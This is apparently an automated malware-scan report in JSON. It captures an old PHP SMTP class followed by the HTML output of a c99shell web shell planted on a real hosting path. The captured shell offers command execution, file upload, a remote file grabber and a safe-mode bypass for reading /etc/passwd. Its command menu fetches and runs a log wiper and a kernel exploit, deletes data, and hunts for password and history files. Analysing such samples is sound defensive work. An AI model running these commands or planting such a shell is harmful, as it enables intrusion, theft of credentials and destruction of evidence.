            "     * @return bool",
            "     */",
            "    function Data($msg_data) {",
            "        $this->error = null; # so no confusion is caused",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Data() without being connected\");",
            "            return false;",
            "        }",
            "        fputs($this->smtp_conn,\"DATA\" . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 354) {",
            "            $this->error =",
            "                array(\"error\" => \"DATA command not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        # the server is ready to accept data!",
            "        # according to rfc 821 we should not send more than 1000",
            "        # including the CRLF",
            "        # characters on a single line so we will break the data up",
            "        # into lines by \\r and/or \\n then if needed we will break",
            "        # each of those into smaller lines to fit within the limit.",
            "        # in addition we will be looking for lines that start with",
            "        # a period '.' and append and additional period '.' to that",
            "        # line. NOTE: this does not count towards are limit.",
            "        # normalize the line breaks so we know the explode works",
            "        $msg_data = str_replace(\"\\r\\n\",\"\\n\",$msg_data);",
            "        $msg_data = str_replace(\"\\r\",\"\\n\",$msg_data);",
            "        $lines = explode(\"\\n\",$msg_data);",
            "        # we need to find a good way to determine is headers are",
            "        # in the msg_data or if it is a straight msg body",
            "        # currently I'm assuming rfc 822 definitions of msg headers",
            "        # and if the first field of the first line (':' sperated)",
            "        # does not contain a space then it _should_ be a header",
            "        # and we can process all lines before a blank \"\" line as",
            "        # headers.",
            "        $field = substr($lines[0],0,strpos($lines[0],\":\"));",
            "        $in_headers = false;",
            "        if(!empty($field) && !strstr($field,\" \")) {",
            "            $in_headers = true;",
            "        }",
            "        $max_line_length = 998; # used below; set here for ease in change",
            "        while(list(,$line) = @each($lines)) {",
            "            $lines_out = null;",
            "            if($line == \"\" && $in_headers) {",
            "                $in_headers = false;",
            "            }",
            "            # ok we need to break this line up into several",
            "            # smaller lines",
            "            while(strlen($line) > $max_line_length) {",
            "                $pos = strrpos(substr($line,0,$max_line_length),\" \");",
            "                # Patch to fix DOS attack",
            "                if(!$pos) {",
            "                    $pos = $max_line_length - 1;",
            "                }",
            "                $lines_out[] = substr($line,0,$pos);",
            "                $line = substr($line,$pos + 1);",
            "                # if we are processing headers we need to",
            "                # add a LWSP-char to the front of the new line",
            "                # rfc 822 on long msg headers",
            "                if($in_headers) {",
            "                    $line = \"\\t\" . $line;",
            "                }",
            "            }",
            "            $lines_out[] = $line;",
            "            # now send the lines to the server",
            "            while(list(,$line_out) = @each($lines_out)) {",
            "                if(strlen($line_out) > 0)",
            "                {",
            "                    if(substr($line_out, 0, 1) == \".\") {",
            "                        $line_out = \".\" . $line_out;",
            "                    }",
            "                }",
            "                fputs($this->smtp_conn,$line_out . $this->CRLF);",
            "            }",
            "        }",
            "        # ok all the message data has been sent so lets get this",
            "        # over with aleady",
            "        fputs($this->smtp_conn, $this->CRLF . \".\" . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 250) {",
            "            $this->error =",
            "                array(\"error\" => \"DATA not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Expand takes the name and asks the server to list all the",
            "     * people who are members of the _list_. Expand will return",
            "     * back and array of the result or false if an error occurs.",
            "     * Each value in the array returned has the format of:",
            "     *     [ <full-name> <sp> ] <path>",
            "     * The definition of <path> is defined in rfc 821",
            "     *",
            "     * Implements rfc 821: EXPN <SP> <string> <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 250",
            "     * SMTP CODE FAILURE: 550",
            "     * SMTP CODE ERROR  : 500,501,502,504,421",
            "     * @access public",
            "     * @return string array",
            "     */",
            "    function Expand($name) {",
            "        $this->error = null; # so no confusion is caused",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Expand() without being connected\");",
            "            return false;",
            "        }",
            "        fputs($this->smtp_conn,\"EXPN \" . $name . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 250) {",
            "            $this->error =",
            "                array(\"error\" => \"EXPN not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        # parse the reply and place in our array to return to user",
            "        $entries = explode($this->CRLF,$rply);",
            "        while(list(,$l) = @each($entries)) {",
            "            $list[] = substr($l,4);",
            "        }",
            "        return $list;",
            "    }",
            "    /**",
            "     * Sends the HELO command to the smtp server.",
            "     * This makes sure that we and the server are in",
            "     * the same known state.",
            "     *",
            "     * Implements from rfc 821: HELO <SP> <domain> <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 250",
            "     * SMTP CODE ERROR  : 500, 501, 504, 421",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Hello($host=\"\") {",
            "        $this->error = null; # so no confusion is caused",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Hello() without being connected\");",
            "            return false;",
            "        }",
            "        # if a hostname for the HELO wasn't specified determine",
            "        # a suitable one to send",
            "        if(empty($host)) {",
            "            # we need to determine some sort of appopiate default",
            "            # to send to the server",
            "            $host = \"localhost\";",
            "        }",
            "        // Send extended hello first (RFC 2821)",
            "        if(!$this->SendHello(\"EHLO\", $host))",
            "        {",
            "            if(!$this->SendHello(\"HELO\", $host))",
            "                return false;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Sends a HELO/EHLO command.",
            "     * @access private",
            "     * @return bool",
            "     */",
            "    function SendHello($hello, $host) {",
            "        fputs($this->smtp_conn, $hello . \" \" . $host . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER: \" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 250) {",
            "            $this->error =",
            "                array(\"error\" => $hello . \" not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        $this->helo_rply = $rply;",
            "        ",
            "        return true;",
            "    }",
            "    /**",
            "     * Gets help information on the keyword specified. If the keyword",
            "     * is not specified then returns generic help, ussually contianing",
            "     * A list of keywords that help is available on. This function",
            "     * returns the results back to the user. It is up to the user to",
            "     * handle the returned data. If an error occurs then false is",
            "     * returned with $this->error set appropiately.",
            "     *",
            "     * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 211,214",
            "     * SMTP CODE ERROR  : 500,501,502,504,421",
            "     * @access public",
            "     * @return string",
            "     */",
            "    function Help($keyword=\"\") {",
            "        $this->error = null; # to avoid confusion",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Help() without being connected\");",
            "            return false;",
            "        }",
            "        $extra = \"\";",
            "        if(!empty($keyword)) {",
            "            $extra = \" \" . $keyword;",
            "        }",
            "        fputs($this->smtp_conn,\"HELP\" . $extra . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 211 && $code != 214) {",
            "            $this->error =",
            "                array(\"error\" => \"HELP not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        return $rply;",
            "    }",
            "    /**",
            "     * Starts a mail transaction from the email address specified in",
            "     * $from. Returns true if successful or false otherwise. If True",
            "     * the mail transaction is started and then one or more Recipient",
            "     * commands may be called followed by a Data command.",
            "     *",
            "     * Implements rfc 821: MAIL <SP> FROM:<reverse-path> <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 250",
            "     * SMTP CODE SUCCESS: 552,451,452",
            "     * SMTP CODE SUCCESS: 500,501,421",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Mail($from) {",
            "        $this->error = null; # so no confusion is caused",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Mail() without being connected\");",
            "            return false;",
            "        }",
            "        fputs($this->smtp_conn,\"MAIL FROM:<\" . $from . \">\" . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 250) {",
            "            $this->error =",
            "                array(\"error\" => \"MAIL not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Sends the command NOOP to the SMTP server.",
            "     *",
            "     * Implements from rfc 821: NOOP <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 250",
            "     * SMTP CODE ERROR  : 500, 421",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Noop() {",
            "        $this->error = null; # so no confusion is caused",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Noop() without being connected\");",
            "            return false;",
            "        }",
            "        fputs($this->smtp_conn,\"NOOP\" . $this->CRLF);",
            "        $rply = $this->get_lines();",
            "        $code = substr($rply,0,3);",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $rply;",
            "        }",
            "        if($code != 250) {",
            "            $this->error =",
            "                array(\"error\" => \"NOOP not accepted from server\",",
            "                      \"smtp_code\" => $code,",
            "                      \"smtp_msg\" => substr($rply,4));",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $this->error[\"error\"] .",
            "                         \": \" . $rply . $this->CRLF;",
            "            }",
            "            return false;",
            "        }",
            "        return true;",
            "    }",
            "    /**",
            "     * Sends the quit command to the server and then closes the socket",
            "     * if there is no error or the $close_on_error argument is true.",
            "     *",
            "     * Implements from rfc 821: QUIT <CRLF>",
            "     *",
            "     * SMTP CODE SUCCESS: 221",
            "     * SMTP CODE ERROR  : 500",
            "     * @access public",
            "     * @return bool",
            "     */",
            "    function Quit($close_on_error=true) {",
            "        $this->error = null; # so there is no confusion",
            "        if(!$this->connected()) {",
            "            $this->error = array(",
            "                    \"error\" => \"Called Quit() without being connected\");",
            "            return false;",
            "        }",
            "        # send the quit command to the server",
            "        fputs($this->smtp_conn,\"quit\" . $this->CRLF);",
            "        # get any good-bye messages",
            "        $byemsg = $this->get_lines();",
            "        if($this->do_debug >= 2) {",
            "            echo \"SMTP -> FROM SERVER:\" . $this->CRLF . $byemsg;",
            "        }",
            "        $rval = true;",
            "        $e = null;",
            "        $code = substr($byemsg,0,3);",
            "        if($code != 221) {",
            "            # use e as a tmp var cause Close will overwrite $this->error",
            "            $e = array(\"error\" => \"SMTP server rejected quit command\",",
            "                       \"smtp_code\" => $code,",
            "                       \"smtp_rply\" => substr($byemsg,4));",
            "            $rval = false;",
            "            if($this->do_debug >= 1) {",
            "                echo \"SMTP -> ERROR: \" . $e[\"error\"] . \": \" .",
            "                         $byemsg . $this->CRLF;",
            "            }",
            "        }",
            "        if(empty($e) <br>bool(false)",
            "</pre>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fclasses%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/classes/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/classes/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/classes/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0108 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c",
            "http://google.com/search"
        ]
    },
    "time": "0:00:00.504943",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
